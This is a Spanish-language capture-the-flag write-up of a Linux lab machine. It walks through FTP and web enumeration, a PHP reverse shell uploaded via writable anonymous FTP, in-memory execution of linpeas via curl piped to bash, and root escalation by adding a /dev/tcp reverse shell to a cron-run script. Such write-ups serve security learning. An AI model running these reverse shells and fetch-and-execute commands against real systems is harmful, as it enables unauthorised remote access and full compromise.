# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -sS -Pn -n -vvv --min-rate 5000 $IP

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 21,22,80 -Pn -n -sVc -c --min-rate 5000 -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.131.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## <font color=red>[~]</font> FTP

Podemos iniciar sesión en el servicio ***FTP*** usando el usuario `anonymous` o `ftp`, obteniendo acceso a unos recursos públicos:
```
- ftp
  |_ important.jpg
  |_ notice.txt
  |_ ftp
	  |_ ** No Hay nada **
```

- ***`notice.txt`***
  En el archivo `notice.txt` encontramos una queja del que parece ser el administrador del sitio web sobre las imágenes que van dejando a base de broma el resto de empleados.
- ***`important.jpg`***
  La imagen es un *meme* del juego ***Among Us*** que no parece dar mayor información. Sin embargo, podemos usar `binwalk` para ver si hay algo escondido dentro de la imagen (***Esteganografía***).
  ```bash
  binwalk important.jog
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  ------------------------------------------------------------------------------
  0             0x0             PNG image, 735 x 458, 8-bit/color RGBA, non-interlaced
  57            0x39            Zlib compressed data, compressed
  ```
  Parece que `binwalk` ha detectado unos datos comprimidos con ***Zlib***.
>[!important]
>Los archivos *PNG* utilizan compresión ***Zlib*** internamente para almacenar los datos de los píxeles (el chunk `IDAT`). Por la posición tan temprana (*byte 57*), es muy probable que `binwalk` esté detectando simplemente los datos reales de la imagen.
>
>Después de investigar un poco no he podido encontrar nada de interés, así que seguí atacando el servicio web.
## <font color=red>[~]</font> Servicio web

Comenzamos la enumeración pasiva del entorno web realizando una solicitud con `curl`:
```bash
curl -i http://$IP

HTTP/1.1 200 OK
Date: Wed, 08 Apr 2026 14:33:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 12 Nov 2020 04:53:12 GMT
ETag: "328-5b3e1b06be884"
Accept-Ranges: bytes
Content-Length: 808
Vary: Accept-Encoding
Content-Type: text/html

<!doctype html>
<title>Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>No spice here!</h1>
    <div>
	<!--when are we gonna update this??-->
        <p>Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, <a href="mailto:#">contact us.</a> Otherwise, don't you worry. We'll be online shortly!</p>
        <p>&mdash; Dev Team</p>
    </div>
</article>
```

Vemos una muy pequeña página web que parece avisar a los clientes que está en mantenimiento. No hay enlaces a otros *endpoints* ni ningún comentario ni script que pudiera darnos más información. Por lo que comenzamos la enumeración activa del entorno web.
### <font color=red>[-]</font> `ffuf`

```bash
ffuf -c -w <(/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt) -u http://$IP/FUZZ -fc 404

files                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 35ms]
```

Encontramos un directorio oculto llamado `files` el cual contiene en su interior el mismo contenido que el servicio ***FTP***, por lo que podemos suponer que el servicio ***FTP*** apunta hacia este directorio accesible a través del ***servicio web***.

Lo primero que se me ocurre es tratar de subir algún archivo malicioso escrito en ***PHP*** que pueda forzar a ejecutar navegando hacia él. 

Lo primero es comprobar si tenemos permiso de escritura en algún directorio de los recursos públicos en el servicio ***FTP***, y vemos que tenemos permisos de escritura en el subdirectorio `ftp`. Por lo que generamos un pequeño script en ***PHP*** que me devuelva una ***Reverse Shell*** cuando se ejecute en el servidor:
```php
<?php
exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/KALI_IP/4444 0>&1"');
?>
```

Una vez tenemos el script lo subimos al servicio ***FTP***:
```bash
ftp> cd ftp

ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||25096|)
150 Ok to send data.
100% |*******************************************************************************************************************************|    84       31.53 KiB/s    00:00 ETA
226 Transfer complete.
84 bytes sent in 00:00 (1.07 KiB/s
```

Tras subir el archivo, debemos de poner el puerto que hemos especificado en escucha (en mi caso el `4444`):
```bash
nc -lvnp 4444
```

Cuando estemos listos debemos de hacer una petición `GET` al recurso que se encontrará en `/http://$IP/files/ftp/shell.php`. Podemos hacerlo usando el navegador o realizando una petición con `curl`.
```bash
curl http://$IP/files/ftp/shell.php
```

>Habremos obtenido una ***reverse shell*** en el puerto que pusimos en escucha.

---
---
# <font color=red>[+]</font> Post-Explotación
## <font color=red>[~]</font> Shell Upgrade

```bash
# En la máquina que acabamos de obtener acceso con el reverse shell
script -c bash /dev/null
# CTRL+Z

stty raw -echo ; fg
# Enter
export TERM=xterm
export PS1="\u@\w> "
```
## <font color=red>[~]</font> Escalada de privilegios

He estado investigando un poco y no he encontrado ninguna forma de escalar privilegios, por lo que para automatizar el proceso ejecutaré `linpeas.sh`. Para no tener que descargar en la máquina `linpeas.sh` (lo cual es una mala práctica ya que quedaría en disco y si se nos olvida eliminarla podría hacer que nos detecten), levantaremos un servidor web usando ***Python*** y haremos una petición `GET` desde la víctima para hacer que se ejecute directamente en la memoria:
```bash
# En nuestra máquina atacante
python3 -m http.server 80 -d /ruta/a/linpeas
## Si no sabes donde está el comando find / -name "linpeas.sh" puede ayudarte

# En la máquina víctima
curl http://IP_KALI/linpeas.sh | bash
## Esto hará que se ejecute directamente en la memoria.
```

Encontramos que en `/` hay un directorio sospechoso llamado `/incidents`, en el que encontramos un archivo `suspicious.pcapng` que si analizamos con Wireshark podemos descubrir que alguien ya realizó una reverse shell antes.

>[!tip]
>Para descargar el archivo usamos ***Python*** para levantar un servidor web al igual que hicimos antes para usar `linpeas.sh`.
>```bash
>cd /incidents
>
>python3 -m http.server 8000
>
># En nuestra máquina atacante
>wget http://$IP:8000/suspicious.pcapng
>```

Cuando lo analizamos con ***Wireshark***, podemos filtrar por la IP del atacante  de la antigua reverse shell (`ip.addr == IP`) y exportar el contenido a texto plano `seleccionando todo > File > Export Packet Dissections > As Plain Text...`.

>Podemos analizar el fichero resultante y encontramos unas credenciales para el usuario `lennie`.

Una vez somos el usuario `lennie` y tenemos permisos para acceder a su directorio *home*, podemos encontrar un directorio `scripts` en el cual se encuentran dos ficheros:
```
scripts:
|_ planner.sh
|_ startup_list.txt
```

El script contiene el siguiente código:
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Aunque no es completamente seguro, parece ser un script que estará configurado mediante ***cronjobs*** para ejecutarse cada x tiempo. Es posible que el usuario que ejecute dicho script mediante ***cron*** sea el usuario `root`. Por lo que es interesante tratar de ejecutar un reverse shell.

Lo primero que se me ocurrió fue asignarle una reverse shell como valor a la variable `$LIST`, para que así se ejecutase (podría funcionar ya que en el *script* la variable `$LIST` no estaba entre comillas `"`). Pero como un usuario normal ***no podemos afectar las variables de un proceso de root*** simplemente haciendo un `export`.

>[!Note]
>En Linux, existe algo llamado ***Aislamiento de Entorno***.
>1. ***El entorno es "hijo" del proceso***
>   Cuando escribimos `export LIST="...` en nuestra terminal, esa variable solo existe en ***esa terminal*** y en los programas que lancemos desde ahí. Es como una burbuja. Root vive en su propia burbuja, y el sistema de `cron` vive en una burbuja todavía más pequeña y aislada.
>2. ***El "limbo" de Cron***
>   El servicio `cron` es famoso en ciberseguridad por tener un entorno extremadamente pobre.
>   - No lee nuestro `.bashrc`.
>   - No lee nuestro `.profile`.
>   - A veces ni siquiera tiene configurado el `$PATH` correctamente.
>   Cuando el ***cronjob*** de `root` se ejecuta, el *shell* que abre nace "limpio". Si el script dice `echo $LIST`, y `$LIST` no ha sido definida ***dentro*** del script o en el archivo de configuración del cron (`/etc/crontab`), la variable estará vacía.
>
>***Cuándo si sería efectivo?***
>Para que nuestro ataque de inyección a través de `$LIST` funcionara, tendríamos que encontrar una forma de que `root` "herede" o "lea" nuestra configuración.
>- ***Sourcing de archivos del usuario:*** Si el script de `root` hace algo como esto:
>  ```bash
>  source /home/usuario/.env
>  echo $LIST > /home/...
>  ```
>  *Aquí sí:* Si nosotros podemos escribir en `/home/usuario/.env`, `root` leerá nuestra variable antes de ejecutar el `echo`.
>- ***Uso de `sudo` con preservación de entorno:*** Si ejecutamos el script manualmente con `sudo -E ./script.sh`. La opción `-E` (preserve-env) obliga a `root` a usar nuestras variables. Pero esto requiere que nosotros ya tengamos ***permisos de sudo***, lo cual anula el propósito de la escalada de privilegios.
>- ***Variables en archivos globales:*** Si logramos en `/etc/environment` o `/etc/profile` (pero de nuevo, necesitaríamos ser `root` para hacer esto).

Si nos fijamos en la tercera línea del *script* (`/etc/print.sh`), vemos que se ejecuta un nuevo script de *bash*. Si vemos el propietario del script `print.sh` tenemos que es el usuario `lennie` y que tenemos permisos de escritura sobre él. Por lo que podemos crear una nueva reverse shell dentro de este script.

>[!important]
>Como el script `planner.sh` se ejecuta como `root` gracias a `crond`, el proceso que se crea tiene permisos totales. Cuando el script ejecuta `/etc/print.sh` se crea un proceso hijo, y como en Linux los hijos heredan los privilegios del padre, `print.sh` se ejecutará como `root`.

>[!caution]
>Por tanto, para escalar privilegios tan solo debemos de modificar el archivo `/etc.print.sh` y añadir una reverse shell como la siguiente:
>```bash
>/bin/bash -i >& /dev/tcp/IP_KALI/5555 0>&1
>``` 
>De esta forma, tras poner el puerto en escucha en nuestra máquina atacante con `nc -lvnp 5555`, obtendremos una shell con permisos de administrador.
